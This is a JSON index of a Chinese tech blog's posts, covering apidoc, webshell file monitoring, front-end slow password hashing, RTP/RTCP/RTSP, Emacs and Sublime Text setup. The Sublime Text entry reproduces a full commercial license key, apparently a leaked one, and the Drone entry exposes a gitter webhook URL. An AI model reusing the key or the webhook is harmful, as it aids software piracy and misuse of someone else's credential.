500,\n \"users\": [\n {\"id\":1, \"username\": \"admin1\", \"name\": \"管理员2\"},\n {\"id\":2, \"username\": \"admin2\", \"name\": \"管理员2\"}\n ],\n }\n @apiExample xml\n users count=\"500\"\n user id=\"1\" username=\"admin1\" name=\"管理员1\" /\n user id=\"2\" username=\"admin2\" name=\"管理员2\" /\n /users\n /\nfunc login(w http.ResponseWriter, r http.Request){\n    // TODO\n}\n\n安装\n\ngo get github.com/caixw/apidoc\n\n 集成\n\n若需要将 apidoc 当作包集成到其它 Go 程序中，可分别引用 input 和 output 的相关函数：\n\nstart := time.Now()\ndocs := doc.New()\n\ntag, err := locale.GetLocale()\nif err != nil {\n    panic(err)\n}\nlocale.SetLocale(tag)\n\n// 分析文档内容\ninputOptions := \u0026input.Options{...}\ndocs, err := input.Parse(docs, inputOptions)\nif err != nil {\n    // TODO\n}\n\n// 输出内容\noutputOptions := \u0026output.Options{...}\noutputOptions.Elapsed = time.Now().Sub(start)\nif err = output.Render(docs, outputOptions); err != nil {\n    // TODO\n}\n\n参与开发\n\n请阅读 CONTRIBUTING.md 文件的相关内容。\n\n 版权\n\n本项目采用 MIT 开源授权许可证，完整的授权说明可在 LICENSE 文件中找到。","tags":null},{"location":"//blog.pytool.com/Post/敏捷开发/系统监控/2016-10-04 Web服务器文件安全监控平台Falcon","title":"Web服务器文件安全监控平台Falcon","text":"http://open-falcon.org/\nhttps://github.com/secrule/falcon\nOpen-Falcon 是小米运维部开源的一款互联网企业级监控系统解决方案.\nFalcon是一款基于inotify-tools 开发的Web服务器文件监控平台\n能够实时监控Web目录文件变化(新增，修改，删除)，判断文件内容是否包含恶意代码，自动隔离常见Webshell，保证Web目录文件安全","tags":null},{"location":"//blog.pytool.com/Hacker/2015-10-01 网络安全 Web前端慢加密","title":"Web前端慢加密","text":"---\n!-- toc --\n0x00 前言\n\n天下武功，唯快不破。但密码加密不同。算法越快，越容易破。\n\n!-- more --\n 0x01 暴力破解\n\n密码破解，就是把加密后的密码还原成明文密码。似乎有不少方法，但最终都得走一条路：暴力穷举。\n\n也许你会说还可以查表，瞬间就出结果。虽然查表不用穷举，但表的制造过程仍然需要。查表只是将穷举提前了而已。\n\n只要算法不可逆，那只能穷举。\n\n穷举的原理很简单。只要知道密文是用什么算法加密的，我们也用相同的算法，把常用的词组跑一遍。若有结果和密文一样，那就猜中了。\n\n穷举的速度有多快？这和加密算法有关。加密一次有多快，猜一次也这么快。\n\n例如 MD5 加密是非常快的。加密一次耗费 1 微秒，那破解时随便猜一个词组，也只需 1 微秒（假设机器性能一样，词组长度也差不多）。攻击者一秒钟就可以猜 100 万个，而且这还只是单线程的速度。\n\n所以，加密算法越快，破解起来就越容易。\n\n0x02 慢加密\n\n如果能提高加密时间，显然也能增加破解时间。\n\n如果加密一次提高到 10 毫秒，那么攻击者每秒只能猜 100 个，破解速度就慢了一万倍。\n\n怎样才能让加密变慢？最简单的，就是对加密后的结果再加密，重复多次。\n\n例如，原本 1 微秒的加密，重复一万次，就慢一万倍了：\n\nfor i = 0 ~ 10000\n    x = md5(x)\nend\n加密时多花一点时间，就可以换取攻击者大量的破解时间。\n\n事实上，这样的「慢加密」算法早已存在，例如 bcrypt、scrypt 等等。它们都有一个难度系数因子，可以控制加密时间，想多慢就多慢。\n\n加密越慢，破解时间越长。\n\n 0x03 慢加密应用\n\n最需要慢加密的场合，就是网站数据库里的密码。\n\n近几年，经常能听到网站被「拖库」的新闻。用户资料都是明文存储，泄露了也无法挽回。唯独密码，还可以和攻击者对抗一下。\n\n然而不少网站，使用的都是快速加密算法，因此轻易就能破解出一堆弱口令账号。\n\n当然，有时只想破解某个特定人物的账号。只要不是特别复杂的密码，跑上几天，很可能就破出来。\n\n但网站用了慢加密，结果可能就不一样了。如果把加密时间提高 100 倍，破解时间就得长达数月，变得难以接受。\n\n即使数据泄露，也能保障「密码」这最后一道隐私。\n\n0x04 慢加密的缺点\n\n不过，慢加密也有明显的缺点：消耗大量计算资源。\n\n使用慢加密的网站，如果同时来了多个用户，服务器 CPU 可能就不够用了。要是遇到恶意用户，发起大量的登录请求，甚至造成资源被耗尽。\n\n所以，性能和安全总是难以兼得。\n\n一些大型网站，甚至为此投入集群，用来处理大量的加密计算。但这需要不少的成本。\n\n有没有什么方法，可以让我们使用算力强劲、同时又免费的计算资源？\n\n 0x05 前端加密\n\n在过去，个人电脑和服务器的性能，还是有较大差距的。但如今，随着硬件发展进入瓶颈，这个差距正缩小。在单线任务处理上，甚至不相上下。\n\n客户端拥有强大的算力，能不能分担一些服务器的工作？\n\n尤其像「慢加密」这种算法开源、但计算沉重的任务，为何不交给客户端来完成？\n\n过去，提交的是明文密码；现在，提交的则是明文密码的慢加密结果。无论是注册，还是登陆。\n\n而服务端，无需任何改动。将收到的慢加密结果，当做原来的明文密码就行。以前是怎么保存的，现在还是怎么保存。\n\n这样就算被拖库，攻击者破解出来的也只是慢加密结果，还需再破解一次，才能还原出「明文密码」。\n\n事实上，慢加密结果这个中间值，是不可能破解出来的！\n\n因为它是一个散列值 ———— 毫无规律的随机串，例如 32 位十六进制字符串，而字典都是有意义的词组，几乎不可能跑到它！\n\n除非字节逐个穷举。但这有 16^32 种组合，是个天文数字。\n\n所以「慢加密结果」是无法通过数据库里泄露的密文「逆推」出来的。\n\n或许你在想，即使不知道明文密码，也可以直接用「慢加密结果」来登录。事实上后端储存时再次加密，就无法逆推出这个散列值了。\n当然，不能逆推，但可以顺推。把字典里的词组，用前后端的算法各调用一次：\n\nbackfasthash( frontslowhash(password) )\n然后对比密文，即可判断有没有猜中。这样就可以用跑字典来破解。\n\n但是有 frontslowhash 这个障碍，破解速度就大幅降低了。\n\n0x06 对抗预先计算\n\n不过，前端的一切都是公开的。所以 frontslowhash 的算法大家都知道。\n\n攻击者可以用这套算法，把常用词组的「慢加密结果」提前算出来，制作成一个「新字典」。将来拖库后，就可以直接跑这个新字典了。\n\n对抗这种方法，还得用经典的手段：加盐。最简单的，将用户名作为盐值：\n\nfrontslowhash(password + username)\n这样，即使相同的密码，对于不同的用户，「慢加密结果」也不一样了。\n\n也许你会说，这个盐值不合理，因为用户名是公开的。攻击者可以对某个重要人物的账号，单独为他建立一个字典。\n\n那么，是否可以提供一个隐蔽的盐值？答案是：不可以。\n\n因为这是在前端。用户还没登录，那返回谁的盐值？登陆前就能获得账号的盐值，这不还是公开的吗。\n\n所以，前端加密的盐值无法隐藏，只能公开。\n\n当然，即使公开，单独提供一个盐值参数，也比用户名要好。因为用户名永远不变，而独立的盐值可以定期更换。\n\n盐值可以由前端生成。例如注册时：\n\n     前端生成盐值\nsalt = rand()\npassword = frontslowhash(password + salt)\n\n     # 提交时带上盐值\nsubmit(..., password, salt)\n后端将用户的盐值也储存起来。\n\n登录时，输完用户名，就可以开始查询用户对应的盐值：\n\n当然要注意的是，这个接口可以测试用户是否存在，所以得有一定的控制。\n盐值的更换，也非常简单，甚至可以自动完成：\n\n前端在加密当前密码时，同时开启一个新线程，计算新盐值和新密码。提交时，将它们全都带上。\n\n如果「当前密码」验证成功，则用「新密码」和「新盐值」覆盖旧的。\n\n这样更换盐值，还是只用到前端的算力。\n\n这一切都是自动的，相当于:在用户无感知的情况下，定期帮他更换密码！\n\n密文变了，针对「特定盐值」制作的字典，也就失效了。得重新制作一次。\n\n0x07 强度策略\n\n密码学上的问题到此结束，下面讨论实现上的问题。\n\n现实中，用户的算力是不均衡的。有人用的是神级配置，也有的是古董机。这样，加密强度就很难设定。\n\n如果古董机用户登录会卡上几十秒，那肯定是不行的。对于这种情况，只有以下选择：\n\n强度固定\n强度可变\n1.强度固定\n\n根据大众的配置，制定一个适中的强度，绝大多数用户都可接受。\n\n但如果超过规定时间还没完成，就把算到一半的 Hash 和步数提交上来，剩余部分让服务器来完成。\n\n[前端] 完成 70%","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-14 Android NDK Application.mk文件","title":"Application.mk","text":"---\r\nApplication.mk目的是描述在你的应用程序中所需要的模块(即静态库或动态库)。\r\nApplication.mk文件通常被放置在 $PROJECT/jni/Application.mk下，$PROJECT指的是您的项目。\r\n简介：","tags":null},{"location":"//blog.pytool.com/Post/流媒体/2016-02-28 实时传输协议介绍：RTP协议介绍、RTCP协议介绍、RTSP协议介绍 ","title":"实时传输协议介绍：RTP协议介绍、RTCP协议介绍、RTSP协议介绍","text":"---\n原文链接\n\nRTP(Real Time Transport Protocol)\n\n  RTP是针对Internet上多媒体数据流的一个传输协议, 由IETF(Internet工程任务组)作为RFC1889发布。RTP被定义为在一对一或一对多的传输情况下工作，其目的是提供时间信息和实现流同步。RTP的典型应用建立在UDP上，但也可以在TCP或ATM等其他协议之上工作。RTP本身只保证实时数据的传输，并不能为按顺序传送数据包提供可靠的传送机制，也不提供流量控制或拥塞控制，它依靠RTCP提供这些服务。\n\n  RTP工作机制\n  威胁多媒体数据传输的一个尖锐的问题就是不可预料数据到达时间。但是流媒体的传输是需要数据的适时的到达用以播放和回放。rtp协议就是提供了时间标签,序列号以及其它的结构用于控制适时数据的流放。在流的概念中”时间标签”是最重要的信息。发送端依照即时的采样在数据包里隐蔽的设置了时间标签。在接受端收到数据包后,就依照时间标签按照正确的速率恢复成原始的适时的数据。不同的媒体格式调时属性是不一样的。但是rtp本身并不负责同步，rtp只是传输层协议，为了简化运输层处理，提高该层的效率。将部分运输层协议功能（比如流量控制）上移到应用层完成。同步就是属于应用层协议完成的。它没有运输层协议的完整功能，不提供任何机制来保证实时地传输数据，不支持资源预留，也不保证服务质量。rtp报文甚至不包括长度和报文边界的描述。同时rtp协议的数据报文和控制报文的使用相邻的不同端口，这样大大提高了协议的灵活性和处理的简单性。\n\n  rtp协议和udp二者共同完成运输层协议功能。udp协议只是传输数据包，不管数据包传输的时间顺序。 rtp的协议数据单元是用udp分组来承载的。在承载rtp数据包的时候，有时候一帧数据被分割成几个包具有相同的时间标签，则可以知道时间标签并不是必须的。而udp的多路复用让rtp协议利用支持显式的多点投递，可以满足多媒体会话的需求。\n\n  rtp协议虽然是传输层协议但是它没有作为osi体系结构中单独的一层来实现。rtp协议通常根据一个具体的应用来提供服务，rtp只提供协议框架，开发者可以根据应用的具体要求对协议进行充分的扩展。\nRTP协议的报文结构\n     RTP头格式：\n\n开始12个八进制出现在每个RTP包中，而CSRC标识列表仅出现在混合器插入时。各段含义如下：\n\n①版本（V）\nversion (V): 2 bits   2位，标识RTP版本,协议初始版本为0，RFC3550中规定的版本号为2。。\n②填充标识（P）\npadding (P): 1 bit   1位，如设置填充位，在包末尾包含了额外的附加信息，它不属于有效载荷。附加信息的最后一个字节表示额外附加信息的长度（包含该字节本身）。该字段之所以存在是因为某些加密算法需要固定大小的填充字，或为在底层协议数据单元中携带几个RTP包。\n③扩展（X）\nextension (X): 1 bit           1位，如果该位被设置，则在固定的头部后存在一个扩展头部，格式定义在RFC3550 5.3.1节。\n④CSRC计数（CC）\nCSRC count (CC): 4 bits    4位，CSRC计数包括紧接在固定头后标识CSRC个数。\n⑤标记（M）\nmarker (M): 1 bit               1位，标记解释由设置定义，目的在于允许重要事件在包流中标记出来。设置可定义其他标示位，或通过改变位数量来指定没有标记位，该位的功能依赖于profile的定义。profile可以改变该位的长度，但是要保持marker和payload type总长度不变（一共是8 bit）。。\n⑥载荷类型（PT）\npayload type (PT): 7 bits   7位，记录后面资料使用哪种 Codec ， receiver 端找出相应的 decoder 解碼出來，该位标记着RTP packet所携带信息的类型，标准类型列出在RFC3551中。如果接收方不能识别该类型，必须忽略该packet。\nPayload Type Codec\n0           PCM μ -Law\n8           PCM-A Law\n9           G..722 audio codec\n4           G..723 audio codec\n15          G..728 audio codec\n18           G..729 audio codec\n34           G..763 audio codec\n31           G..761 audio codec\n⑦系列号\nsequence number:16 bits  16位，系列号随每个RTP数据包发送后而增加1，接收方可以根据该序列号重新排列数据包顺序，或者探测包损失。系列号初值是随机的，使对加密的文本攻击更加困难。\n⑧时标\ntimestamp: 32 bits             32位，时标反映RTP数据包中第一个八进制数的采样时刻，采样时刻必须从单调、线性增加的时钟导出，以允许同步与抖动计算。时标可以让receiver端知道在正确的时间将资料播放出来。\n\n   由上图可知，如果只有系列号，并不能完整按照顺序的将data播放出来，因为如果data中间有一段是没有资料的，只有系列号的话会造成错误，需搭配上让它知道在哪个时间将data正确播放出来，如此我们才能播放出正确无误的信息。\n⑨SSRC\nSSRC: 32 bits                     32位，SSRC段标识同步源。此标识不是随机选择的，目的在于使同一RTP包连接中没有两个同步源有相同的SSRC标识，也就是在一个RTP Session其间每个数据流都应该有一个不同的SSRC。尽管多个源选择同一个标识的概率很低，所有RTP实现都必须探测并解决冲突。如源改变源传输地址，也必须选择一个新SSRC标识以避免插入成环行源。\n⑩CSRC列表\nCSRC list: 0 to 15 items     bits0到15项，每项32位。CSRC列表表示包内的对载荷起作用的源。标识数量由CC段给出。如超出15个作用源，也仅标识15个。CSRC标识由混合器插入，采用作用源的SSRC标识。只有存在Mixer的时候才有效。如一个将多声道的语音流合并成一个单声道的语音流，在这里就列出原来每个声道的SSRC。\n\n RTCP(Real Time Contorl Protocol)\n\nRTCP负责管理传输质量在当前应用进程之间交换控制信息。在RTP会话期间，各参与者周期性地传送RTCP包，包中含有已发送的数据包的数量、丢失的数据包的数量等统计资料。因此，服务器可以利用这些信息动态地改变传输速率，甚至改变有效载荷类型。RTP和RTCP配合使用，能以有效的反馈和最小的开销使传输效率最佳化，故特别适合传送网上的实时数据。\nRTCP工作机制\n当应用程序开始一个rtp会话时将使用两个端口：一个给rtp，一个给rtcp。\nrtp本身并不能为按顺序传送数据包提供可靠的传送机制，也不提供流量控制或拥塞控制，它依靠rtcp提供这些服务。在rtp的会话之间周期的发放一些rtcp包以用来传监听服务质量和交换会话用户信息等功能。rtcp包中含有已发送的数据包的数量、丢失的数据包的数量等统计资料。因此，服务器可以利用这些信息动态地改变传输速率，甚至改变有效载荷类型。rtp和rtcp配合使用，它们能以有效的反馈和最小的开销使传输效率最佳化，因而特别适合传送网上的实时数据。根据用户间的数据传输反馈信息，可以制定流量控制的策略，而会话用户信息的交互，可以制定会话控制的策略。\n\nRTCP协议将控制包周期发送给所有连接者，应用与数据包相同的分布机制。底层协议提供数据与控制包的复用，如使用单独的UDP端口号。RTCP执行下列四大功能：\n\n主要是提供数据发布的质量反馈。是作为RTP传输协议的一部分，与其他传输协议的流和阻塞控制有关。反馈对自适应编码控制直接起作用，但IP组播经验表明，从发送者收到反馈对诊断发送错误是致关重要的。给所有参加者发送接收反馈报告允许问题观察者估计那些问题是局部的，还是全局的。诸如IP组播等发布机制使网络服务提供商类团体可能接收反馈信息，充当第三方监控者来诊断网络问题。反馈功能由RTCP发送者和接收者报告执行。\n\nRTCP带有称作规范名字（CNAME）的RTP源持久传输层标识。如发现冲突，或程序重新启动，既然SSRC标识可改变，接收者需要CNAME跟踪参加者。接收者也需要CNAME 与相关RTP连接中给定的几个数据流联系\n\n前两种功能要求所有参加者发送RTCP包，因此，为了RTP扩展到大规模数量，速率必须受到控制。让每个参加者给其它参加者发送控制包，就大独立观察参加者数量。该数量用语计算包发送的速率。\n\n第四个可选功能是传送最小连接控制信息，如参加者辨识。最可能用在\"松散控制\"连接，那里参加者自由进入或离开，没有成员控制或参数协调，RTCP充当通往所有参加者的方便通道，但不必支持应用的所有控制通讯要求。在IP组播场合应用RTP时，前3个功能是必须的，推荐用于所有情形。RTP应用设计人员必须避免使用仅在单播模式下工作的机制，那将导致无法扩展规模。\n\n RTCP数据报\n在RTCP通信控制中，RTCP协议的功能是通过不同的RTCP数据报来实现的，主要有如下几种类型：\n①SR:发送端报告，所谓发送端是指发出RTP数据报的应用程序或者终端，发送端同时也可以是接收端。\n②RR:接收端报告，所谓接收端是指仅接收但不发送RTP数据报的应用程序或者终端。\n③SDES:源描述，主要功能是作为会话成员有关标识信息的载体，如用户名、邮件地址、电话号码等，此外还具有向会话成员传达会话控制信息的功能。\n④BYE:通知离开，主要功能是指示某一个或者几个源不再有效，即通知会话中的其他成员自己将退出会话。\n⑤APP:由应用程序自己定义，解决了RTCP的扩展性问题，并且为协议的实现者提供了很大的灵活性。\n\nSDES: 源描述RTCP包\nSDES 包为三层结构，由头与数据块组成，数据块可以没有，也可有多个，组成项描述块所表明的源。项描述如下：\n版本（V）、填充（P）、长度： 如SR包中所描述。\n包类型（PT）： 8位，包含常数202，识别RTCP SDES包。\n源计数（SC）： 5位，包含在SDES包中的SSRC/CSRC块数量，零值有效，但没有意义。\n源描述项内容如下：\nCNAME: 规范终端标识SDES项 CNAME标识属性如下：\n        如发生冲突或重启程序，由于随机分配的SSRC标识可能发生变化，需要CNAME项提供从SSRC标识到仍为常量的源标识的绑定。 象SSRC标识，CNAME标识在RTP连接的所有参加者中应是唯一的。 为了提供一套相关RTP连接中某个参加者所采用的跨多媒体工具间的绑定，CNAME应固定为那个参加者。 为方便第三方监控，CNAME应适合程序或人员定位源。\nNAME：用户名称SDES项\nBYE：断开RTCP包\n     如混合器接收到一个BYE包，混合器转发BYE包，而不改变SSRC/CSRC 标识。如混合器关闭，它也应该发出一个BYE包，列出它所处理的所有源，而不只是自己的SSRC标识。作为可选项，BYE包可包括一个8位八进制计数，后跟很多八进制文本，表示离开原因，如：\"camera malfunction\"或\"RTP loop detected\"。字符串具有同样的编码，如在SDES 中所描述的。如字符串填充包至下32位边界，字符串就不以空结尾；否则，BYE包以空八进制填充。\nAPP：定义应用的RTCP包\nAPP包用于开发新应用和新特征的实验，不要求注册包类型值。带有不可识别名称的APP包应被忽略掉。测试后，如确定应用广泛，推荐重新定义每个APP包，而不用向IANA注册子类型和名称段。\n\nRTSP（Real Time Streaming Protocol）\n\n协议特点：\n\n● 可扩展性：新方法和参数很容易加入RTSP。\n● 易解析：RTSP可由标准 HTTP或MIME解析器解析。\n● 安全：RTSP使用网页安全机制。\n● 独立于传输：RTSP传输通道，可使用不可靠数据包协议（UDP）或可靠数据包协议（RDP），如要实现应用级可靠，可使用诸如TCP的可靠流协议。\n● 记录设备控制：协议可控制记录和回放设备。\n● 适合专业应用：通过SMPTE 时标，RTSP支持帧级精度，允许远程数字编辑。\n● 演示描述中立：协议未强加特殊演示或元文件，可传送所用格式类型；然而，演示描述至少需包含一个RTSP URI。\n● 代理与防火墙友好：协议可由应用和传输层防火墙处理。防火墙需要理解SETUP方法，为UDP媒体流打开一个“缺口”。\n● 适当的服务器控制：如用户启动一个流，则也可以停止一个流。\n● 传输协调：实际处理连续媒体流前，用户可协调传输方法。\n● 性能协调：如基本特征无效，则必须有一些清理机制让用户决定那种方法不生效。这允许用户提出适合自己的界面。\n同其他协议的关系：\n\n       RTSP在功能上与HTTP有重叠，最明显的交叉是在流媒体内容的发布上——","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone支持gitter","title":"drone支持gitter","text":"https://webhooks.gitter.im/e/f8c369697302929c7807\n\npipeline:\n  gitter:\n    image: plugins/gitter\n    webhook: https://webhooks.gitter.im/e/f8c369697302929c7807\n\nGITTER_WEBHOOK","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 Emacs 插件","title":"文本编辑 Emacs","text":"treemacs 替换neotree 侧边栏\r\nlinum-mode显示侧边栏的行号。\r\n\r\nf - 处理文件相关的库\r\ns - 处理字符串相关的库\r\nag - 据说比ack更快的文本搜索工具 thesilversearcher\r\n的emacs插件\r\nht - 处理哈希相关的库\r\nanzu - 显示当前匹配文本，预览替换效果和总匹配数的插件\r\ndash - 常用函数集合\r\nhelm - 方便查找各种文件内容,buffer切换,emacs命令执行等\r\njedi - python代码补全，快速需要函数/模块定义的插件\r\nsmex - M-x 的命令行补全的功能\r\ndirex - 展示目录树\r\nmagit - git插件\r\nslime - commonlisp交互模式\r\nac-js2 - js2-mode支持js函数定义查找\r\nrinari - 依赖,需要安装\r\ndiff-hl - 在行首用颜色表示git状态-只支持图形界面的emacs\r\ndired-k - 用带不同颜色的高亮显示文件/目录,大小等信息\r\nbind-key - 本项目绑定快捷键的用法都根据这个包,没有用global-set-key\r\ncss-mode - css-mode\r\njs2-mode - js-mode的升级版\r\nweb-mode - 前端开发必备, html缩进,支持根据tag/元素/属性/block/dom跳转,语法高亮,支持mako,jinja2等模板\r\ngit-blame - git-blame,单独版\r\nkey-chord - 可以快速按键达到快捷键的作用\r\nnyan-mode - 一直可爱的小猫\r\nplim-mode - 我写的编辑plim的major-mode\r\npowerline - 提供一个漂亮的状态栏\r\nsass-mode - 编辑sass\r\nscss-mode - 编辑scss\r\nsublimity - 在图形界面的emacs能缩小预览代码-sublime-text有类似的插件\r\nundo-tree - 让undo可视化\r\nyaml-mode - 编辑yaml\r\nyasnippet - 一个神奇的模板系统,定义缩写并通过tab键自动帮你展开(一些自动的”填空题”机制)\r\ndrag-stuff - 可以将代码块整体拖动\r\nhelm-swoop - 项目内关键词查找,并能自动跳到对应文件和对应行\r\nibuffer-vc - 支持版本空的ibuffer模式\r\nprojectile - 管理项目，可快速访问项目里任何文件，支持全项目关键词搜索\r\ncoffee-mode - 编辑coffee\r\npython-mode - 编辑python\r\nsmartparens - 自动括号匹配,可以按块删除,tag跳转\r\nuse-package - 本项目引用包的方式\r\ncrontab-mode - 高亮编辑crontab\r\ngolden-ratio - 黄金分割展示当前window\r\nhelm-ipython - helm的ipython插件\r\nrainbow-mode - 在代码中通过背景色标示颜色值\r\nace-jump-mode - 快速让光标位置到你想去的地方\r\nexpand-region - 按层次块区域选择\r\nhelm-css-scss - helm的css/scss插件\r\nmarkdown-mode - 编辑markdown\r\nswitch-window - 可视化切换窗口\r\nvisual-regexp - 可视化正则匹配\r\ngitconfig-mode - 单独的gitconfig-mode\r\ngitignore-mode - 单独的gitignore-mode\r\nhelm-descbinds - 让默认的 C-h b\r\n高亮并且按组分开\r\nimenu-anywhere - 类似于etag, 可直接跳到对应的标签\r\nmultiple-cursors - 一次编辑多处/行文字\r\ndiscover-my-major - 告诉你当前mode的一些说明/快捷键设置\r\nvirtualenvwrapper - virtualenvwrapper\r\ngitattributes-mode - 独立的gitattributes-mode\r\nrainbow-delimiters - 对内嵌的括号等pair符号加不同颜色\r\nidle-highlight-mode - 在设置的一段设置时间未操作电脑会自动高亮当前关键词,并且全文高亮相同关键词\r\nexec-path-from-shell - 可以使用$PATH环境变量\r\nfind-file-in-repository - 根据git属性在项目里查找文件\r\nemmet-mode - 类似于zencoding，但是能编辑css,使用很少的代码就能构造一个复杂的div/css\r\nbrowse-kill-ring - 查看最近操作的删除文本,以及恢复后的效果","tags":null},{"location":"//blog.pytool.com/Hacker/01_端口扫描/2016-10-29 masscan","title":"Masscan：最快的互联网IP端口扫描器","text":"原文连接\nMasscan：最快的互联网IP端口扫描器","tags":null},{"location":"//blog.pytool.com/Post/Elastic/x-pack/2016-10-04 Elastic 安全先-pack","title":"Kibana 5.x 加强安全","text":"---\n【入门篇】Elasticsearch、Kibana权限控制 (http://blog.csdn.net/pistolove/article/details/53838138)\nx-pack 安全审计\n\nelasticsearch logstash随着kibana的命名升级直接从2.4跳跃到了5.0，5.x版本的elk在版本对应上要求相对较高，不再支持5.x和2.x的混搭，同时elastic做了一个package，对原本的watch，alert做了一个封装，形成了x-pack\n\n安装 x-pack\nelasticsearch","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 SublimeText","title":"文本编辑 Sublime Text 3","text":"快捷键\nctrl+p                  文件切换\nctrl+shift+p            系统函数\nctrl+shift+R            转到项目中的符号\nctrl+r  =   ctrl+p @    快速跳转到文件中的某个函数处\nctrl+g  =   ctrl+p :    跳转到指定行\nctrl+;  =   ctrl+p #    在当前文件中快速搜索内容\nAlt+O可以实现头文件和源文件之间的快速切换\nCtrl+Shift+T        恢复刚刚关闭的标签\n注释：\nctrl+/                  单行注释 及取消注释\nctrl+shift+/            区块注释\n\n删除\nCtrl+KK：                从光标处删除至行尾\nCtrl+Shift+K            删除光标所在行\nCtrl+X                  删除当前行\n\n复制\nCtrl+Shift+D            复制光标所在行\nctrl+shift+↑↓   光标定位到某一行-》上下移动一行\nctrl+shift+↑↓ 选中之后-》上下移动选中区域。\n\nCtrl+KU     改为大写\nCtrl+KL     改为小写\nAlt+.       闭合当前标签\nCtrl+Shift+[    折叠代码\nCtrl+Shift+]    展开代码\nCtrl+KJ     展开全部代码\nCtrl+K1     折叠代码等级\n\n选择\nctrl+l  继续选择下一行\nctrl+d  选择整个单词,继续按向下查找\n\nctrl+shift+l        打散行\nctrl+J              合并行\n\nCtrl+M              切换匹配brackets标签\nCtrl+Shift+J        选择匹配的indentation标签的内容\nctrl+shift+space    选择scope 标签的内容 \" \" [ ] { } ()\nctrl+shift+M        选择brackets标签的内容 \" \" [ ] { } ()\n\nCtrl + Enter        在当前行下面新增一行然后跳至该行\nCtrl + Shift + Enter在当前行上面增加一行并跳至该行。\n列选择模式\n    1.鼠标右键+shift\n    2.Ctlr+Shift+上下箭头\n\n{ \"keys\": [\"alt+d\"], \"command\": \"gotodefinition\" },\n{ \"keys\": [\"alt+-\"], \"command\": \"jumpback\" },\n{ \"keys\": [\"alt+=\"], \"command\": \"jumpforward\" },\n\n退出\nctrl+shift+w            迅速退出\n\n安装Sublime Text 3\n\nsudo add-apt-repository ppa:webupd8team/sublime-text-3\nsudo apt-get update\nsudo apt-get install sublime-text\n\n—– BEGIN LICENSE —–\nMichael Barnes\nSingle User License\nEA7E-821385\n8A353C41 872A0D5C DF9B2950 AFF6F667\nC458EA6D 8EA3C286 98D1D650 131A97AB\nAA919AEC EF20E143 B361B1E7 4C8B7F04\nB085E65E 2F5F5360 8489D422 FB8FC1AA\n93F6323C FD7F7544 3F39C318 D95E6480\nFCCC7561 8A4A1741 68FA4223 ADCEDE07\n200C25BE DBBC4855 C4CFB774 C5EC138C\n0FEC1CEF D9DCECEC D3A5DAD1 01316C36\n—— END LICENSE ——\n\n 为Package Control设置代理\n\nimport urllib.request,os,hashlib; h = '2915d1851351e5ee549c20394736b442' + '8bc59f460fa1548d1514676163dafc88'; pf = 'Package Control.sublime-package'; ipp = sublime.installedpackagespath(); urllib.request.installopener( urllib.request.buildopener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); print('Error validating download (got %s instead of %s), please try manual install' % (dh, h)) if dh != h else open(os.path.join( ipp, pf), 'wb' ).write(by)\n\nPreferences-  Package Settings-  Package Control -  ( Settings - Default | Settings - User)\nPackage Control.sublime-settings\n{\n    \"httpproxy\": \"127.0.0.1:8087\",\n    \"httpsproxy\": \"127.0.0.1:8087\",\n    \"installedpackages\":\n    [\n        \"ConvertToUTF8\",\n        \"CTags\",\n        \"Git\",\n        \"MakeCommands\",\n        \"MIPS Syntax\",\n        \"SideBarEnhancements\",\n        \"Vintageous\"\n    ]\n}\n快捷键优化\n1.SublimeText自带格式化代码\n该选项的路径：Edit - Line - Reindent（中文路径则是：编辑 - 行 - 再次缩进）\n\n2.其实这个 key setting 就是用回车向右移动一格 不过有两个要求\n第一个要求是说光标后的内容必须符合 \"^[)\\\\]\\\\  \\\\'\\\\\\\"]\" 这个 regex。\n基本就是光标后为 ) ]   ' \" 的时候。\n注意是用的是followingtext 还有 是 regexcontains\n第二个要求是说光标前的内容必须不符合 \"^.\\\\{$\" 这个 regex。\n就是说光标的左边不能是 {\n这次用的是 precedingtext 和 notregexmatch\n所以说其实并没有跳出括号 只是向右移动罢了\nDefault (Windows).sublime-keymap\n[\n    //CodeFormat:Edit --  Line --  Reindent\n    {\"keys\": [\"ctrl+alt+a\"], \"command\": \"reindent\" , \"args\":{\"singleline\": false}},\n    //Auto Skip{[()]}\n    {\"keys\": [\"enter\"], \"command\": \"move\", \"args\": {\"by\": \"characters\", \"forward\": true}, \"context\":\n            [\n                { \"key\": \"followingtext\", \"operator\": \"regexcontains\", \"operand\": \"^[)\\\\]\\\\  \\\\'\\\\\\\"\\\\ %  \\\\}\\\\;\\\\,]\", \"matchall\": true },\n                { \"key\": \"precedingtext\", \"operator\": \"notregexmatch\", \"operand\": \"^.\\\\{$\", \"matchall\": true  },\n                { \"key\": \"autocompletevisible\", \"operator\": \"equal\", \"operand\": false }\n            ]\n        }\n]\n 帮助菜单优化\nMain.sublime-menu\n[    {\n        \"id\": \"help\",\n        \"children\":\n        [\n            { \"caption\": \"-\" },\n            { \"command\": \"openurl\", \"args\": {\"url\": \"http://www.baidu.com\"}, \"caption\": \"Baidu\" },\n            { \"command\": \"openfile\", \"args\": {\"file\": \"${packages}/../KEEPME\"}, \"caption\": \"KEEPME\" },\n        ]\n    }\n]\n添加Java编译环境\nTools-  build system-  new build system\n{\n     \"cmd\": [\"javac\",\"-encoding\",\"UTF-8\",\"$file\"],\n     \"fileregex\": \"^(...?):([0-9]):?([0-9])\",\n     \"selector\": \"source.java\",\n     \"encoding\":\"GBK\",\n     \"variants\":\n    [\n        {\n            \"name\": \"Run\",\n            \"cmd\" :  [\"java\", \"$filebasename\"],\n            \"encoding\":\"GBK\"\n        }\n    ]\n}\n\n 系统配置\nPreferences.sublime-settings\n{\n  \"theme\": \"Spacegray Eighties.sublime-theme\",\n  \"colorscheme\": \"Packages/Theme - Spacegray/base16-eighties.dark.tmTheme\",\n  \"fontface\":\"DejaVu Sans Mono\",\n  // \"fontface\":\"Droid Sans Mono\",\n  \"fontsize\": 12.0,\n  \"rulers\": [80],\n  \"tabsize\": 4,\n  \"usetabstops\": true,\n  \"translatetabstospaces\": true,\n  \"highlightline\": true,\n  \"highlightmodifiedtabs\": true,// #设置文件修改时, 标签高亮提示\n  \"showencoding\": true, //在窗口右下角显示打开文件的编码\n  \"automatchenabled\": false,    //禁用自动补全\n  \"alwaysshowminimapviewport\": 